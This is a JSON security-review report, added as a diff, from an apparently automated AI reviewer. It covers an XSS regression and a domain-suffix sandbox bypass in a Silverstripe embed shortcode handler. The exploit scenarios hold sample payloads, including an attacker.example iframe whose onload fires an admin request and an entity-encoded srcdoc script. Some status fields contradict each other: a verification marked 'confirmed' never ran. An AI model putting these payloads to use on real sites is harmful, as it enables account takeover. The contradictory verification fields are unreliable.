@@ -1,0 +1,366 @@
+{
+  "schema_version": 1,
+  "generated_at": "2026-08-28T16:35:28+00:00",
+  "summary": "The change touches one file, `src/View/Shortcodes/EmbedShortcodeProvider.php` (Silverstripe's `[embed]` shortcode handler). It deletes the private helper `removeDangerousAttributes()` and changes the \"simple single iframe\" fast path in `sandboxHtml()` to `return $html;` unchanged.\n\nI read the file in full to establish the trust model and the data flow. `sandboxHtml()` is the security boundary for third-party oEmbed markup: anything it does not recognise is re-wrapped into a `data:text/html` iframe carrying the configured `sandboxed_iframe_attributes`, so remote HTML cannot execute in the site's origin. Only two paths escape that wrapping — the configured domain exclusion at line 382, and the single-iframe fast path at lines 386-393. I traced the source (`$extractor->code->html`, i.e. markup returned by whatever remote server the embedded URL resolves to, reached via `handle_shortcode` → `embeddableToHtml` → `videoEmbed`) and the sink (`DBField::create_field('HTMLFragment', $content)` at line 228, rendered unescaped by design).\n\nFindings, both reported:\n\n1. The fast path now emits provider-controlled iframe markup verbatim. The remaining guards (`^<iframe[^>]*>`, `</iframe\\s*>$`, `substr_count($html, '<') <= 2`) constrain only tag shape and `<` count, not attributes, so `onload=` / `onerror=` handlers and entity-encoded `srcdoc` payloads now pass through to the page's own origin. The deleted helper was exactly the control that removed them, via an attribute allowlist plus rejection of `javascript:`/`data:`/`vbscript:`/`file:` schemes on `src`. Reported as introduced by this change.\n\n2. Pre-existing, in the exclusion gate I had to read to settle reachability: `domainIsExcludedFromSandboxing()` uses `str_ends_with()` with no label boundary, so a configured `youtube.com` also matches an attacker-registered `evilyoutube.com`, bypassing sandboxing entirely. Rated medium/low-confidence because the declared default for the setting is an empty array and no site configuration is present in this repository.\n\nOne related symptom I did not report separately: the width/height `preg_replace` in `videoEmbed()` (lines 206-214) interpolates the shortcode's `width`/`height` arguments into the markup without escaping, so a value like `1\" onload=\"...` can inject an attribute. Before this change that was neutralised by `removeDangerousAttributes()` on the fast path and by the data-URI wrapping otherwise; it becomes live only through the same root cause as finding 1, so I folded it into that finding rather than duplicating it.\n\nI did not manufacture additional issues — the rest of the file (cache key derivation, attribute allowlisting in `buildAttributeListFromArguments`, the `linkEmbed`/`photoEmbed` paths) is unchanged and uses `Convert::raw2att` appropriately.",
+  "mode": "diff",
+  "model": "claude-opus-5",
+  "complete": false,
+  "finished_explicitly": true,
+  "unresolved": [
+    "The repository as provided contains only src/View/Shortcodes/EmbedShortcodeProvider.php — no templates, no YAML config, no routing or permission layer. I could not read the EmbedShortcodeProvider_video template to confirm with my own eyes that Content is emitted unescaped, nor confirm the HTMLFragment casting behaviour from source; both are inferred from Silverstripe's documented semantics for HTMLFragment.",
+    "Because no routing or CMS permission code is visible, I could not determine who is allowed to author an [embed] shortcode on a given install, so reachable_without_authentication is recorded as 'unclear' on both findings. On a stock CMS this requires an authenticated content author; on a site that renders user-submitted HTMLText it could be unauthenticated.",
+    "I could not see any real site configuration for domains_excluded_from_sandboxing. Finding 2 is unexploitable at the declared default (empty array) and depends entirely on deployment configuration I could not inspect.",
+    "I could not check the project's test suite for cases asserting that dangerous attributes are stripped from the fast path — no tests exist in this corpus — so I could not confirm whether this deletion was a deliberate revert accompanied by a compensating control elsewhere in the wider codebase."
+  ],
+  "stop_reason": "error",
+  "stop_detail": "the CLI reported '(no subtype)' and exited 1. A process that failed and still printed a success object has not agreed with itself, and this runner does not choose the reassuring half.",
+  "trace_markdown": "",
+  "verdict": {
+    "exit_code": 2,
+    "blocked": true,
+    "reason": "Review incomplete — the review ended with an error (the CLI reported '(no subtype)' and exited 1. A process that failed and still printed a success object has not agreed with itself, and this runner does not choose the reassuring half.). The result cannot be treated as a pass. Set SECURITY_SCAN_FAIL_ON_INCOMPLETE=false to allow partial reviews through.",
+    "blocking_fingerprints": [],
+    "not_gated_on": []
+  },
+  "counts": {
+    "reported": 2,
+    "blocking": 0,
+    "refuted": 0,
+    "suppressed": 0,
+    "rejected_claims": 0,
+    "by_severity": {
+      "low": 0,
+      "medium": 2,
+      "high": 0,
+      "critical": 0
+    }
+  },
+  "findings": [
+    {
+      "fingerprint": "3eea7d4c42bb9d64",
+      "title": "Removal of iframe attribute sanitiser allows stored XSS via embed shortcode",
+      "severity": "medium",
+      "confidence": "high",
+      "category": "xss",
+      "file": "src/View/Shortcodes/EmbedShortcodeProvider.php",
+      "line": 390,
+      "impact": "state_change",
+      "reachable_without_authentication": "unclear",
+      "requires_user_interaction": "yes",
+      "severity_derivation": "state_change → high; needs a victim to act → medium",
+      "evidence": "            if (substr_count($html, '<') <= 2) {\n                return $html;\n            }",
+      "description": "`sandboxHtml()` is the security boundary for third-party oEmbed markup: everything it does not recognise is wrapped into a `data:text/html` iframe with the configured `sandboxed_iframe_attributes`, so remote HTML never executes in the site's origin. The one exception is the \"simple single iframe\" fast path at lines 386-393, which returns the provider's markup to be rendered directly into the page.\n\nBefore this change that fast path was still filtered by `removeDangerousAttributes()`, which stripped every attribute outside a strict allowlist (`src`, `width`, `height`, `frameborder`, `allow`, `allowfullscreen`, `referrerpolicy`, `loading`, `scrolling`, `allowtransparency`, `title`) and additionally rejected `src` values whose scheme was `javascript`, `data`, `vbscript` or `file`. The diff deletes that method and replaces the call with `return $html;`, so the raw remote markup is now emitted unmodified.\n\nThe guard conditions do not substitute for attribute filtering. `preg_match('#^<iframe[^>]*>#')`, `preg_match('#</iframe\\s*>$#')` and `substr_count($html, '<') <= 2` only constrain the tag shape and the number of `<` characters; they place no constraint whatsoever on which attributes appear on the iframe. Markup such as `<iframe src=\"https://example.com/\" onload=\"...\"></iframe>` contains exactly two `<` characters and satisfies both regexes, so it now flows straight through.\n\nThe sink is in `videoEmbed()` at line 224-228: the returned string is passed to `sandboxHtml()` and then cast with `DBField::create_field('HTMLFragment', $content)`, which Silverstripe renders unescaped by design, placing the attacker's iframe in the page's own origin. Two payload families are immediately available: an inline event handler (`onload`/`onerror`), which executes in the parent document's context, and `srcdoc` with entity-encoded markup (`<iframe srcdoc=\"&lt;script&gt;...&lt;/script&gt;\"></iframe>`, still only two `<` characters), which renders a same-origin document. Both were previously removed by the attribute allowlist.\n\nNote that `domainIsExcludedFromSandboxing()` is a separate, explicitly configured opt-out; it is not what makes this path safe, and it returns early at line 382 before this code is reached.",
+      "exploit_scenario": "A content author (a role normally below administrator) inserts `[embed url=\"https://attacker.example/page\"]` into a page body. Resolving the shortcode causes the server to fetch that URL and take the oEmbed provider's `code->html` as the embed markup, so the attacker controls that string exactly. The attacker's server returns `<iframe src=\"https://attacker.example/v\" onload=\"fetch('/admin/security/add',{...})\"></iframe>`. This starts with `<iframe...>`, ends with `</iframe>`, and contains two `<` characters, so it takes the fast path at line 390-391 and is returned verbatim instead of being attribute-filtered. It is then rendered as an `HTMLFragment` into the published page. When an administrator views that page in the CMS preview or on the front end, the `onload` handler runs in the site's origin with the admin's session, letting the attacker perform authenticated actions as that administrator. The same holds without any malicious author if a legitimate third-party oEmbed provider is compromised — that untrusted-provider case is precisely why the sandbox exists.",
+      "recommendation": "Restore attribute filtering on the unsandboxed fast path rather than returning `$html` unchanged — reinstate `removeDangerousAttributes()` (allowlist of attribute names plus rejection of `javascript:`/`data:`/`vbscript:`/`file:` in `src`), and ensure `srcdoc` is not on the allowlist. A more robust alternative is to stop trusting the provider's markup entirely: parse the iframe, extract only the `src` URL, validate its scheme against `https`/`http`, and rebuild the tag with `HTML::createTag('iframe', [...])` from known-safe attributes, so no provider-supplied attribute is ever echoed. Regex-based shape checks such as `substr_count($html, '<') <= 2` should not be relied on as a sanitisation control.",
+      "verification": {
+        "verdict": "confirmed",
+        "reason": "reported unverified — verification could not run (You've hit your session limit · resets 9:30pm (Europe/Sofia).\n\n## ⚠️ AI security review was killed before it finished\n\n> [!WARNING]\n> **This is not a result.** The review process was killed — a time limit, an out-of-memory kill, or the CLI itself dying — so it reached no conclusion and produced no verdict. What follows is the record it appended as it went: how far it got, not what it found. Nothing here was verified, nothing here blocks or clears anything, and code that is not mentioned was not necessarily examined.\n\n_verifier mode · 5480728cfa4d..0762e79be92e · 0 tool calls started · 0 finished · 0 findings claimed · last record 2026-08-28 16:35:27 UTC_\n; You've hit your session limit · resets 9:30pm (Europe/Sofia).\n\n## ⚠️ AI security review was killed before it finished\n\n> [!WARNING]\n> **This is not a result.** The review process was killed — a time limit, an out-of-memory kill, or the CLI itself dying — so it reached no conclusion and produced no verdict. What follows is the record it appended as it went: how far it got, not what it found. Nothing here was verified, nothing here blocks or clears anything, and code that is not mentioned was not necessarily examined.\n\n_verifier mode · 5480728cfa4d..0762e79be92e · 0 tool calls started · 0 finished · 0 findings claimed · last record 2026-08-28 16:35:27 UTC_\n; You've hit your session limit · resets 9:30pm (Europe/Sofia).\n\n## ⚠️ AI security review was killed before it finished\n\n> [!WARNING]\n> **This is not a result.** The review process was killed — a time limit, an out-of-memory kill, or the CLI itself dying — so it reached no conclusion and produced no verdict. What follows is the record it appended as it went: how far it got, not what it found. Nothing here was verified, nothing here blocks or clears anything, and code that is not mentioned was not necessarily examined.\n\n_verifier mode · 5480728cfa4d..0762e79be92e · 0 tool calls started · 0 finished · 0 findings claimed · last record 2026-08-28 16:35:27 UTC_\n)",
+        "votes": [
+          {
+            "verdict": "uncertain",
+            "reasoning": "",
+            "corrected_impact": "",
+            "corrected_confidence": "",
+            "error": "You've hit your session limit · resets 9:30pm (Europe/Sofia).\n\n## ⚠️ AI security review was killed before it finished\n\n> [!WARNING]\n> **This is not a result.** The review process was killed — a time limit, an out-of-memory kill, or the CLI itself dying — so it reached no conclusion and produced no verdict. What follows is the record it appended as it went: how far it got, not what it found. Nothing here was verified, nothing here blocks or clears anything, and code that is not mentioned was not necessarily examined.\n\n_verifier mode · 5480728cfa4d..0762e79be92e · 0 tool calls started · 0 finished · 0 findings claimed · last record 2026-08-28 16:35:27 UTC_\n"
+          },
+          {
+            "verdict": "uncertain",
+            "reasoning": "",
+            "corrected_impact": "",
+            "corrected_confidence": "",
+            "error": "You've hit your session limit · resets 9:30pm (Europe/Sofia).\n\n## ⚠️ AI security review was killed before it finished\n\n> [!WARNING]\n> **This is not a result.** The review process was killed — a time limit, an out-of-memory kill, or the CLI itself dying — so it reached no conclusion and produced no verdict. What follows is the record it appended as it went: how far it got, not what it found. Nothing here was verified, nothing here blocks or clears anything, and code that is not mentioned was not necessarily examined.\n\n_verifier mode · 5480728cfa4d..0762e79be92e · 0 tool calls started · 0 finished · 0 findings claimed · last record 2026-08-28 16:35:27 UTC_\n"
+          },
+          {
+            "verdict": "uncertain",
+            "reasoning": "",
+            "corrected_impact": "",
+            "corrected_confidence": "",
+            "error": "You've hit your session limit · resets 9:30pm (Europe/Sofia).\n\n## ⚠️ AI security review was killed before it finished\n\n> [!WARNING]\n> **This is not a result.** The review process was killed — a time limit, an out-of-memory kill, or the CLI itself dying — so it reached no conclusion and produced no verdict. What follows is the record it appended as it went: how far it got, not what it found. Nothing here was verified, nothing here blocks or clears anything, and code that is not mentioned was not necessarily examined.\n\n_verifier mode · 5480728cfa4d..0762e79be92e · 0 tool calls started · 0 finished · 0 findings claimed · last record 2026-08-28 16:35:27 UTC_\n"
+          }
+        ],
+        "claimed_severity": "high",
+        "claimed_confidence": "high",
+        "claimed_line": 391,
+        "evidence_located_line": 390,
+        "line_corrected": true,
+        "introduced_by_this_change": true,
+        "attributed_by": "added",
+        "removes_existing_control": false,
+        "path_verified": true
+      },
+      "suppressed_by": ""
+    },
+    {
+      "fingerprint": "8ce8a019b68fb7e9",
+      "title": "Sandbox exclusion uses unanchored domain suffix match (pre-existing)",
+      "severity": "medium",
+      "confidence": "medium",
+      "category": "authn-authz",
+      "file": "src/View/Shortcodes/EmbedShortcodeProvider.php",
+      "line": 435,
+      "impact": "state_change",
+      "reachable_without_authentication": "unclear",
+      "requires_user_interaction": "yes",
+      "severity_derivation": "state_change → high; needs a victim to act → medium",
+      "evidence": "            if (str_ends_with($domain, $excludedDomain)) {\n                return true;\n            }",
+      "description": "This is pre-existing code the diff does not modify, but it is the first gate in `sandboxHtml()` and I had to read it to establish whether the changed fast path was reachable, so I am reporting it.\n\n`domainIsExcludedFromSandboxing()` compares the host of the resolved embed URL against each configured excluded domain with `str_ends_with($domain, $excludedDomain)`. The comparison has no label boundary: it matches on a raw string suffix rather than on a dot-delimited subdomain boundary. Configuring `youtube.com` therefore also matches hosts such as `evilyoutube.com`, `myyoutube.com` or `notyoutube.com`, all of which an attacker can register.\n\nWhen this returns true, `sandboxHtml()` returns at line 382-384 with the provider's markup completely untouched — it never reaches the iframe shape checks or (previously) the attribute allowlist. So a suffix collision yields unrestricted HTML injection into the page, which is strictly broader than the fast-path issue reported separately.\n\nThe declared default for `domains_excluded_from_sandboxing` in this file is an empty array, so a default installation is unaffected; exploitation requires a site that has configured at least one exclusion, which is the intended use of the setting. I could not see any site configuration in this repository, which is why I am not rating this higher.",
+      "exploit_scenario": "A site configures `SilverStripe\\View\\Shortcodes\\EmbedShortcodeProvider.domains_excluded_from_sandboxing: ['youtube.com']` so that YouTube embeds render natively. An attacker registers `evilyoutube.com` and serves an oEmbed endpoint there. A content author (or the attacker, on any site where embed URLs can be supplied by a lower-privileged user) inserts `[embed url=\"https://evilyoutube.com/watch?v=1\"]`. `parse_url` yields host `evilyoutube.com`; `str_ends_with('evilyoutube.com', 'youtube.com')` is true, so `sandboxHtml()` returns the attacker's markup verbatim at line 383 with no shape or attribute checks at all. The attacker's oEmbed response returns arbitrary HTML — for example a `<script>` tag or an element with an inline event handler — which is rendered as an `HTMLFragment` into the page and executes in the site's origin when any visitor or administrator views it.",
+      "recommendation": "Match on a domain boundary rather than a bare string suffix, and accept an exact match: e.g. `if ($domain === $excludedDomain || str_ends_with($domain, '.' . $excludedDomain))`. Normalise both sides to lower case and strip any trailing dot before comparing so that `YouTube.com` and `youtube.com.` are handled consistently.",
+      "verification": {
+        "verdict": "confirmed",
+        "reason": "not verified — reported for information only, as it cannot block the merge at the current settings (below the high severity threshold)",
+        "votes": [],
+        "claimed_severity": "medium",
+        "claimed_confidence": "medium",
+        "claimed_line": 435,
+        "evidence_located_line": 435,
+        "line_corrected": false,
+        "introduced_by_this_change": false,
+        "attributed_by": "",
+        "removes_existing_control": false,
+        "path_verified": true
+      },
+      "suppressed_by": ""
+    }
+  ],
+  "refuted": [],
+  "suppressed": [],
+  "rejected_claims": [],
+  "coverage": {
+    "files_examined": [
+      "src/View/Shortcodes/EmbedShortcodeProvider.php"
+    ],
+    "exposures": [
+      [
+        "src/View/Shortcodes/EmbedShortcodeProvider.php",
+        "get_diff"
+      ],
+      [
+        "src/View/Shortcodes/EmbedShortcodeProvider.php",
+        "read_file"
+      ],
+      [
+        "src/View/Shortcodes/EmbedShortcodeProvider.php",
+        "search_code"
+      ]
+    ],
+    "turns": 0,
+    "tool_calls": [
+      {
+        "turn": 0,
+        "tool": "list_changed_files",
+        "summary": "1 changed file(s), 0 generated",
+        "rejected": false
+      },
+      {
+        "turn": 0,
+        "tool": "get_diff",
+        "summary": "diff for all files (3900 chars)",
+        "rejected": false
+      },
+      {
+        "turn": 0,
+        "tool": "read_file",
+        "summary": "read src/View/Shortcodes/EmbedShortcodeProvider.php",
+        "rejected": false
+      },
+      {
+        "turn": 0,
+        "tool": "git_log",
+        "summary": "git log src/View/Shortcodes/EmbedShortcodeProvider.php",
+        "rejected": false
+      },
+      {
+        "turn": 0,
+        "tool": "search_code",
+        "summary": "search 'EmbedShortcodeProvider': 0 match(es)",
+        "rejected": false
+      },
+      {
+        "turn": 0,
+        "tool": "search_code",
+        "summary": "search 'removeDangerousAttributes|sandboxHtml|sandboxed_iframe_attributes': 4 match(es)",
+        "rejected": false
+      },
+      {
+        "turn": 0,
+        "tool": "search_code",
+        "summary": "search '_video|_photo|_link': 0 match(es)",
+        "rejected": false
+      },
+      {
+        "turn": 0,
+        "tool": "search_code",
+        "summary": "search 'domains_excluded_from_sandboxing|sandboxed_iframe': 0 match(es)",
+        "rejected": false
+      },
+      {
+        "turn": 0,
+        "tool": "search_code",
+        "summary": "search 'class HTMLFragment': 0 match(es)",
+        "rejected": false
+      },
+      {
+        "turn": 0,
+        "tool": "list_directory",
+        "summary": "listed .",
+        "rejected": false
+      },
+      {
+        "turn": 0,
+        "tool": "report_finding",
+        "summary": "recorded high xss at src/View/Shortcodes/EmbedShortcodeProvider.php:390",
+        "rejected": false
+      },
+      {
+        "turn": 0,
+        "tool": "report_finding",
+        "summary": "recorded medium authn-authz at src/View/Shortcodes/EmbedShortcodeProvider.php:435",
+        "rejected": false
+      },
+      {
+        "turn": 0,
+        "tool": "finish_review",
+        "summary": "finish_review: 4 unresolved",
+        "rejected": false
+      }
+    ]
+  },
+  "usage": {
+    "reported": true,
+    "complete": false,
+    "unreported_stages": 1,
+    "requests": 1,
+    "input_tokens": 16,
+    "output_tokens": 10200,
+    "cache_read_tokens": 123421,
+    "cache_write_tokens": 18255
+  },
+  "revision": {
+    "mode": "diff",
+    "base": "5480728cfa4dba2f813d3086baa77c48b0aa306c",
+    "head": "0762e79be92e180ababfa9219f498a79bec2b447",
+    "base_sha": "5480728cfa4dba2f813d3086baa77c48b0aa306c",
+    "head_sha": "0762e79be92e180ababfa9219f498a79bec2b447"
+  },
+  "identity": {
+    "base_sha": "5480728cfa4dba2f813d3086baa77c48b0aa306c",
+    "head_sha": "0762e79be92e180ababfa9219f498a79bec2b447",
+    "mode": "diff",
+    "agent_version": "0.1.0",
+    "model_requested": "claude-opus-5",
+    "system_prompt_sha": "bd359730e26be159",
+    "verifier_prompt_sha": "4c3ea369c2d10317",
+    "schema_sha": "771225ae1a564f71",
+    "settings": {
+      "fail_on": "high",
+      "min_confidence": "medium",
+      "gate_pre_existing": false,
+      "gate_removed_controls": true,
+      "ungated_categories": [],
+      "verify": true,
+      "verify_votes": 1,
+      "effort": "high",
+      "verifier_context_chars": 20000,
+      "suppressions": "",
+      "excludes": [
+        "*.eot",
+        "*.gif",
+        "*.ico",
+        "*.jpeg",
+        "*.jpg",
+        "*.lock",
+        "*.map",
+        "*.min.css",
+        "*.min.js",
+        "*.mo",
+        "*.pb.go",
+        "*.pdf",
+        "*.png",
+        "*.pyc",
+        "*.snap",
+        "*.svg",
+        "*.ttf",
+        "*.woff",
+        "*.woff2",
+        "*/.terraform/*",
+        "*/__snapshots__/*",
+        "*/build/*",
+        "*/dist/*",
+        "*/node_modules/*",
+        "*/vendor/*",
+        "*_pb2.py",
+        "Cargo.lock",
+        "Gemfile.lock",
+        "composer.lock",
+        "go.sum",
+        "package-lock.json",
+        "pnpm-lock.yaml",
+        "poetry.lock",
+        "yarn.lock"
+      ],
+      "fail_on_incomplete": true,
+      "verify_max_findings": 40,
+      "verify_model": "",
+      "verify_effort": "high",
+      "diff_ceiling_bytes": 0,
+      "scope": []
+    }
+  },
+  "provenance": {
+    "model_requested": "claude-opus-5",
+    "models_served": [
+      "claude-opus-5"
+    ],
+    "model_substituted": false,
+    "system_prompt_sha": "bd359730e26be159",
+    "verifier_prompt_sha": "4c3ea369c2d10317",
+    "schema_sha": "771225ae1a564f71",
+    "agent_version": "0.1.0",
+    "provider": "claude-cli",
+    "auth_method": "claude.ai",
+    "auth_subscription": "max",
+    "reported_cost_usd": 0.5002875
+  },
+  "coverage_accounting": {
+    "changed": [
+      "src/View/Shortcodes/EmbedShortcodeProvider.php"
+    ],
+    "examined": [
+      "src/View/Shortcodes/EmbedShortcodeProvider.php"
+    ],
+    "excluded": [],
+    "out_of_scope": [],
+    "diff_truncated": false,
+    "unopened": [],
+    "complete": true
+  },
+  "stage_metrics": {
+    "citations": {
+      "accepted": 2,
+      "rejected_unknown_path": 0,
+      "rejected_not_found": 0,
+      "rejected_ambiguous": 0,
+      "rejected_too_short": 0,
+      "lines_corrected": 1
+    },
+    "verification": {
+      "verified": 1,
+      "skipped": 1,
+      "failed": 1,
+      "verdicts_changed": 0
+    }
+  },
+  "turns_detail": [],
+  "settings": {
+    "fail_on": "high",
+    "min_confidence": "medium",
+    "gate_pre_existing": false,
+    "gate_removed_controls": true,
+    "ungated_categories": [],
+    "verify": true,
+    "verify_votes": 1,
+    "effort": "high",
+    "scope": []
+  }
+}
